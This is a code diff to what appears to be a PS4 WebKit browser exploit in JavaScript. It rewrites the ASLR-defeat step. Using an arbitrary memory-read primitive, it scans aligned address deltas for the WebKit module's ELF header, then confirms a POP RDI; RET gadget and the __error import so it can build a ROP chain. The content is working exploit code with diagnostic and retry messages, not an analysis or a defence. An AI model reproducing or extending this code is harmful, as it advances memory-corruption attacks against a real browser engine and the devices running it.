@@ -261,22 +261,55 @@ function nativeFnForOff(p, off) {
 }
 
 const ELF_MAGIC = 0x464c457f;
+const CAL_ALIGN_STEP = 0x4000;
+const CAL_DEFAULT_MIN = 0x1e00000;
+const CAL_DEFAULT_MAX = 0x4500000;
 
-/** Fixed delta tries only — no scan loops (PS4 OOM). Hint too small → try higher deltas. */
-function hintCandidates(tableHint) {
-    const out = [tableHint];
-    for (let k = 1; k <= 24; k++)
-        out.push(tableHint + k * 0x4000);
-    for (let k = 1; k <= 4; k++)
-        out.push(tableHint - k * 0x4000);
+function parseCalHex(name, fallback) {
+    const v = parseInt(params.get(name) || "", 16);
+    return v > 0 ? v : fallback;
+}
+
+/** Every 16 KiB-aligned delta where nativeFn - delta is module-aligned. */
+function alignedDeltaRange(nativeFn, minDelta, maxDelta) {
+    const residue = nativeFn.low & (CAL_ALIGN_STEP - 1);
+    let d = minDelta >>> 0;
+    const r = d & (CAL_ALIGN_STEP - 1);
+    if (r !== residue)
+        d = (d + ((residue - r + CAL_ALIGN_STEP) & (CAL_ALIGN_STEP - 1))) >>> 0;
+    const out = [];
+    for (; d <= maxDelta; d = (d + CAL_ALIGN_STEP) >>> 0)
+        out.push(d);
     return out;
 }
 
-function tryElfAtDelta(p, nativeFn, delta) {
+function tryElfAtDelta(p, nativeFn, delta, gadgetRva) {
     if (delta < 0) return null;
     const base = nativeFn.sub32(delta);
     if (!alignedWebkitBase(base)) return null;
     if (read4p(p, base) !== ELF_MAGIC) return null;
+    if (gadgetRva) {
+        const w = read4p(p, base.add32(gadgetRva));
+        if (w == null || (w & 0xffff) !== 0xc35f)
+            return null;
+    }
+    return { delta, base };
+}
+
+function tryGadgetAtDelta(p, nativeFn, delta, gadgetRva) {
+    if (delta < 0 || !gadgetRva) return null;
+    const base = nativeFn.sub32(delta);
+    if (!alignedWebkitBase(base)) return null;
+    const w = read4p(p, base.add32(gadgetRva));
+    if (w == null || (w & 0xffff) !== 0xc35f) return null;
+    return { delta, base };
+}
+
+function tryErrorImportAtDelta(p, nativeFn, delta, tableOff) {
+    if (delta < 0 || !tableOff.wk___imp___error) return null;
+    const base = nativeFn.sub32(delta);
+    if (!alignedWebkitBase(base)) return null;
+    if (!tryTableErrorImportDirect(p, base, tableOff)) return null;
     return { delta, base };
 }
 
@@ -305,33 +338,67 @@ function calibrateLiteSync(p, tableOff) {
         return null;
     }
 
-    const hint = tableOff.wk_expm1_builtin;
-    if (hint == null) {
-        mark("CAL-FAIL", "no wk_expm1_builtin");
-        return null;
-    }
-
     try {
         sessionStorage.setItem("wk-nativeFn", String(nativeFn));
     } catch (_) { }
 
-    const tries = hintCandidates(hint);
-    for (let i = 0; i < tries.length; i++) {
-        const delta = tries[i];
-        if (delta < 0) continue;
-        const hit = tryElfAtDelta(p, nativeFn, delta);
+    const calMin = parseCalHex("calmin", CAL_DEFAULT_MIN);
+    const calMax = parseCalHex("calmax", CAL_DEFAULT_MAX);
+    const chunkSize = parseInt(params.get("calchunk") || "0", 10) || 0;
+    const chunkOff = parseInt(params.get("caloff") || "0", 10) || 0;
+    const gadgetRva = tableOff.wk_POP_RDI_RET || 0x5c480;
+
+    const all = alignedDeltaRange(nativeFn, calMin, calMax);
+    const slice = chunkSize > 0
+        ? all.slice(chunkOff, chunkOff + chunkSize)
+        : all;
+
+    mark("CAL-SCAN", "nativeFn=" + nativeFn
+        + " align=0x" + (nativeFn.low & 0x3fff).toString(16)
+        + " range=0x" + calMin.toString(16) + "-0x" + calMax.toString(16)
+        + " tries=" + slice.length + (chunkSize ? "/" + all.length : ""));
+
+    for (let i = 0; i < slice.length; i++) {
+        if (i > 0 && (i % 128) === 0)
+            mark("CAL-PROG", i + "/" + slice.length);
+        const hit = tryElfAtDelta(p, nativeFn, slice[i], gadgetRva);
         if (hit)
             return finishCalibrate(tableOff, mFunctionOff, hit.delta, hit.base,
-                i === 0 ? "table-hint" : "hint+#" + i + "(0x" + delta.toString(16) + ")");
+                "elf@0x" + hit.delta.toString(16));
     }
 
-    const base = nativeFn.sub32(hint);
-    const magic = read4p(p, base);
-    mark("CAL-FAIL", "ELF miss after " + tries.length + " fixed tries");
+    mark("CAL-PHASE", "ELF miss — gadget POP_RDI @0x" + gadgetRva.toString(16));
+    for (let i = 0; i < slice.length; i++) {
+        const hit = tryGadgetAtDelta(p, nativeFn, slice[i], gadgetRva);
+        if (hit)
+            return finishCalibrate(tableOff, mFunctionOff, hit.delta, hit.base,
+                "gadget@0x" + hit.delta.toString(16));
+    }
+
+    if (tableOff.wk___imp___error) {
+        mark("CAL-PHASE", "__error import probe");
+        for (let i = 0; i < slice.length; i++) {
+            const hit = tryErrorImportAtDelta(p, nativeFn, slice[i], tableOff);
+            if (hit)
+                return finishCalibrate(tableOff, mFunctionOff, hit.delta, hit.base,
+                    "error-imp@0x" + hit.delta.toString(16));
+        }
+    }
+
+    const hint = tableOff.wk_expm1_builtin;
+    const hintBase = hint != null ? nativeFn.sub32(hint) : null;
+    const magic = hintBase ? read4p(p, hintBase) : null;
+    mark("CAL-FAIL", "miss after " + slice.length + " aligned tries");
     mark("CAL-NATIVEFN", String(nativeFn));
-    mark("CAL-DIAG", "hint base=" + base + " magic=0x"
-        + (magic == null ? "null" : magic.toString(16)));
-    mark("HINT", "paste CAL-NATIVEFN — we compute expm1 offline");
+    if (hintBase)
+        mark("CAL-DIAG", "table-hint base=" + hintBase + " magic=0x"
+            + (magic == null ? "null" : magic.toString(16))
+            + " (table anchor wrong for this build — not a dump issue)");
+    if (chunkSize > 0 && chunkOff + chunkSize < all.length)
+        mark("CAL-NEXT", "retry with ?caloff=" + (chunkOff + chunkSize)
+            + "&calchunk=" + chunkSize);
+    else if (all.length >= slice.length && calMax < 0x5000000)
+        mark("CAL-NEXT", "widen with ?calmax=0x5000000");
     return null;
 }
 
@@ -507,7 +574,7 @@ async function runEstablish() {
     saveSession();
     if (calibratedOff) {
         state("primitive + cal OK — run step 2 verify", "ok");
-        mark("READY", "nano-cal inline (~29 ELF reads)");
+        mark("READY", "aligned scan inline (~600 read4, no dump needed)");
     } else {
         state("primitive OK — cal failed, retry step 3 or paste CAL-NATIVEFN", "warn");
         mark("READY", "retry cal (step 3) or ?expm1=0x... if known");
